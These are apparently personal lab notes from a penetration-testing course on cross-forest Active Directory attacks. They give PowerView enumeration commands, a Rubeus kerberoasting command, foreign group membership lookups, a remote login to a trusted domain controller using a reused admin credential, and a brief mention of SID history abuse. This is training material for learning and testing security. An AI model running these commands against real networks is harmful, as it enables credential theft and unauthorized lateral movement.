# Cross-Forest Kerberoasting
Kerberoasting and ASREP-Roasting and be performed across trusts, depending on the trust function
  
## Enumerating Accounts for Associated SPNs Using Get-DomainUser
```JavaScript
Get-DomainUser -SPN -Domain <trusted_domain> | select SamAccountName
```
- in their example, the trusted domain was FREIGHTLOGISTICS.LOCAL
![[/image 359.png|image 359.png]]
  
## Enumerating Accounts with SPNs
for their example, they used mssqlsvc
```JavaScript
Get-DomainUser -Domain <domain> -Identity <user> |select samaccountname,memberof
```
![[/image 1 267.png|image 1 267.png]]
- we can se that mssqlsvc is part of domain admins
  
## Kerberoasting with Rubeus Using /domain Flag
```JavaScript
.\Rubeus.exe kerberoast /domain:<DOMAIN> /user:<user> /nowrap
```
![[/image 2 226.png|image 2 226.png]]
  
# Admin Password Re-Use & Group Membership
## Using Get-DomainForeignGroupMember
Using PowerView
```JavaScript
Get-DomainForeignGroupMember -Domain <DOMAIN>
```
![[/image 3 196.png|image 3 196.png]]
- from this output, we can see that administrator from the built-in administrators group in FREIGHTLOGISTICS.LOCAL has the built-in admin account from INLANEFREIGHT.LOCAL
  
## Accessing Trusted DCUsing Enter-PSSession
```JavaScript
Enter-PSSession -ComputerName <computer_name> -Credential <DOMAIN>\administrator
```
![[/image 4 172.png|image 4 172.png]]
- we connected to the DC for the trusted domain “FREIGHTLOGISTICS.LOCAL” using the administrator account from INLANEFREIGHT.LOCAL
  
  
# SID History Abuse - Cross Forest
if SID filtering is not enabled, we can authenticate across forests
![[/image 5 161.png|image 5 161.png]]